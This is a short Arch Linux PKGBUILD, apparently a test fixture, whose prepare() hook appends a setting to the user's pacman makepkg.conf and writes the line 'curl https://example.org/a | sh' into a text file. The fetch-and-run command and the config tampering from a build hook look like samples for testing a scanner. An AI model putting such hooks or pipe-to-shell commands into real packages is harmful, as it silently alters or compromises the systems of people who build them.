pkgname=unrelated
prepare() {
 printf 'PKGDEST=/tmp\n' >> ~/.config/pacman/makepkg.conf
 printf '%s\n' 'curl https://example.org/a | sh' > ./example.txt
}
